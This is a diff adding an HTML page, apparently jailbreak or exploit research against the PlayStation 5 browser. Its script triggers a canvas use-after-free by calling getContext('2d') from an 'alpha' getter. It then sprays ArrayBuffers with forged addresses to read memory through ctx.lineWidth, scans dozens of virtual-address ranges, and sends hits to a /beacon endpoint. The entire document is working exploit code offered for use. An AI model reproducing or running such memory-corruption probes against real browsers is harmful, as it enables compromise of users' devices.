@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>PS5 Canvas UAF v2 - Wide VA Scan</title>
+<style>html,body{background:#000;color:#0f0;font:12px monospace;margin:8px}#out{white-space:pre-wrap}</style>
+</head>
+<body><pre id="out">=== Canvas UAF v2: Wide VA Scanner ===</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var q=0;q<200;q++)_imgs.push(new Image());
+var _bi=0;
+function bk(msg){
+  say(msg);
+  try{_imgs[_bi++].src='/beacon?m='+encodeURIComponent(msg)+'&t='+Date.now();}catch(e){}
+}
+
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+function f2h(v){
+  _f64[0]=v;return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);
+}
+
+bk('UA: '+navigator.userAgent);
+
+function doProbe(targetHi, targetLo, desc) {
+  var readLo = targetLo - 48;
+  var readHi = targetHi;
+  if(readLo < 0){ readLo += 0x100000000; readHi -= 1; }
+
+  var tgtHex='0x'+('00000000'+targetHi.toString(16)).slice(-8)+('00000000'+targetLo.toString(16)).slice(-8);
+
+  var c = document.createElement('canvas');
+  c.width=1; c.height=1;
+  var ctx = null;
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {get: function(){
+    ctx = c.getContext('2d');
+    return true;
+  }});
+  c.getContext('bitmaprenderer', opts);
+  if(!ctx) return {ok:false, err:'no ctx'};
+
+  for(var f=0;f<600;f++) new ArrayBuffer(16);
+
+  var abs=[], dvs=[];
+  for(var i=0;i<200;i++){
+    var ab = new ArrayBuffer(768);
+    abs.push(ab);
+    dvs.push(new DataView(ab));
+  }
+
+  for(var w=0;w<dvs.length;w++){
+    dvs[w].setUint32(112, readLo, true);
+    dvs[w].setUint32(116, readHi, true);
+    dvs[w].setUint32(120, 1, true);
+    dvs[w].setUint32(124, 1, true);
+  }
+
+  var val = ctx.lineWidth;
+
+  ctx = null;
+  for(var j=0;j<dvs.length;j++){
+    for(var z=112;z<128;z+=4) dvs[j].setUint32(z,0,true);
+  }
+
+  return {ok:true, val:val, hex:f2h(val), addr:tgtHex, desc:desc};
+}
+
+/*
+ * WIDE SCAN: covers sub-4GB (which was missed!), 4-64GB, 64-512GB, and sparse above.
+ * Previous scan tested only game process ranges (0x30-0x88 in high bytes) and missed
+ * the actual low VA where WebProcess PIE binary / heap likely lives.
+ * [hi32, lo32, description]
+ */
+var TARGETS = [
+  /* SUB-4GB: standard PIE binary / heap range on FreeBSD amd64 */
+  [0x00000000, 0x00200000, 'va-2M'],
+  [0x00000000, 0x00400000, 'va-4M'],
+  [0x00000000, 0x00800000, 'va-8M'],
+  [0x00000000, 0x01000000, 'va-16M'],
+  [0x00000000, 0x02000000, 'va-32M'],
+  [0x00000000, 0x04000000, 'va-64M'],
+  [0x00000000, 0x08000000, 'va-128M'],
+  [0x00000000, 0x10000000, 'va-256M'],
+  [0x00000000, 0x20000000, 'va-512M'],
+  [0x00000000, 0x40000000, 'va-1G'],
+  [0x00000000, 0x80000000, 'va-2G'],
+  [0x00000000, 0xC0000000, 'va-3G'],
+
+  /* 4-64GB at 4GB stride */
+  [0x00000001, 0x00100000, 'va-4G'],
+  [0x00000002, 0x00100000, 'va-8G'],
+  [0x00000003, 0x00100000, 'va-12G'],
+  [0x00000004, 0x00100000, 'va-16G'],
+  [0x00000005, 0x00100000, 'va-20G'],
+  [0x00000006, 0x00100000, 'va-24G'],
+  [0x00000007, 0x00100000, 'va-28G'],
+  [0x00000008, 0x00100000, 'va-32G'],
+  [0x00000009, 0x00100000, 'va-36G'],
+  [0x0000000A, 0x00100000, 'va-40G'],
+  [0x0000000B, 0x00100000, 'va-44G'],
+  [0x0000000C, 0x00100000, 'va-48G'],
+  [0x0000000D, 0x00100000, 'va-52G'],
+  [0x0000000E, 0x00100000, 'va-56G'],
+  [0x0000000F, 0x00100000, 'va-60G'],
+
+  /* 64-256GB at 16GB stride (around game process ranges) */
+  [0x00000010, 0x00100000, 'va-64G'],
+  [0x00000014, 0x00100000, 'va-80G'],
+  [0x00000018, 0x00100000, 'va-96G'],
+  [0x0000001C, 0x00100000, 'va-112G'],
+  [0x00000020, 0x00100000, 'va-128G'],
+  [0x00000024, 0x00100000, 'va-144G'],
+  [0x00000028, 0x00100000, 'va-160G'],
+  [0x0000002C, 0x00100000, 'va-176G'],
+  [0x00000034, 0x00100000, 'va-208G'],
+  [0x00000038, 0x00100000, 'va-224G'],
+  [0x0000003C, 0x00100000, 'va-240G'],
+  [0x00000044, 0x00100000, 'va-272G'],
+  [0x00000048, 0x00100000, 'va-288G'],
+  [0x0000004C, 0x00100000, 'va-304G'],
+  [0x00000054, 0x00100000, 'va-336G'],
+  [0x00000058, 0x00100000, 'va-352G'],
+  [0x0000005C, 0x00100000, 'va-368G'],
+  [0x00000064, 0x00100000, 'va-400G'],
+  [0x00000068, 0x00100000, 'va-416G'],
+  [0x0000006C, 0x00100000, 'va-432G'],
+  [0x00000074, 0x00100000, 'va-464G'],
+  [0x00000078, 0x00100000, 'va-480G'],
+  [0x0000007C, 0x00100000, 'va-496G'],
+
+  /* 512GB-4TB sparse */
+  [0x00000084, 0x00100000, 'va-528G'],
+  [0x00000090, 0x00100000, 'va-576G'],
+  [0x000000A0, 0x00100000, 'va-640G'],
+  [0x000000C0, 0x00100000, 'va-768G'],
+  [0x00000100, 0x00100000, 'va-1T'],
+  [0x00000200, 0x00100000, 'va-2T'],
+  [0x00000400, 0x00100000, 'va-4T'],
+];
+
+var MAX = TARGETS.length;
+var attempt = 0;
+try { attempt = parseInt(localStorage.getItem('co2_attempt')) || 0; } catch(e) {}
+
+var prevHits = [];
+try {
+  var ph = localStorage.getItem('co2_hits');
+  if(ph) prevHits = JSON.parse(ph);
+} catch(e) {}
+
+bk('[BOOT] attempt='+attempt+'/'+MAX+' prevHits='+prevHits.length);
+
+if(prevHits.length > 0) {
+  for(var h=0;h<prevHits.length;h++) {
+    bk('[PREV-HIT] '+prevHits[h]);
+  }
+}
+
+if(attempt >= MAX) {
+  bk('[EXHAUSTED] all '+MAX+' targets tested');
+  bk('[SUMMARY] hits='+prevHits.length);
+  for(var s=0;s<prevHits.length;s++) bk('[HIT] '+prevHits[s]);
+  try{localStorage.removeItem('co2_attempt');localStorage.removeItem('co2_hits');}catch(e){}
+} else {
+  var hits = prevHits.slice();
+
+  for(var t=attempt; t<MAX; t++) {
+    var tgt = TARGETS[t];
+    var tgtHex='0x'+('00000000'+tgt[0].toString(16)).slice(-8)+('00000000'+tgt[1].toString(16)).slice(-8);
+    bk('[TGT] #'+t+' '+tgtHex+' '+tgt[2]);
+
+    try{localStorage.setItem('co2_attempt', String(t+1));}catch(e){}
+    try{localStorage.setItem('co2_hits', JSON.stringify(hits));}catch(e){}
+
+    var r = doProbe(tgt[0], tgt[1], tgt[2]);
+
+    if(r.ok) {
+      var hitStr = r.addr+'|'+r.hex+'|'+r.desc+'|val='+r.val;
+      hits.push(hitStr);
+      bk('[***HIT***] '+hitStr);
+      try{localStorage.setItem('co2_hits', JSON.stringify(hits));}catch(e){}
+    } else {
+      bk('[ERR] '+tgt[2]+': '+r.err);
+    }
+  }
+
+  bk('[COMPLETE] tested '+MAX+' targets, hits='+hits.length);
+  for(var s2=0;s2<hits.length;s2++) bk('[FINAL-HIT] '+hits[s2]);
+  try{localStorage.setItem('co2_attempt', String(MAX));}catch(e){}
+  try{localStorage.setItem('co2_hits', JSON.stringify(hits));}catch(e){}
+}
+
+bk('[END]');
+</script>
+</body></html>
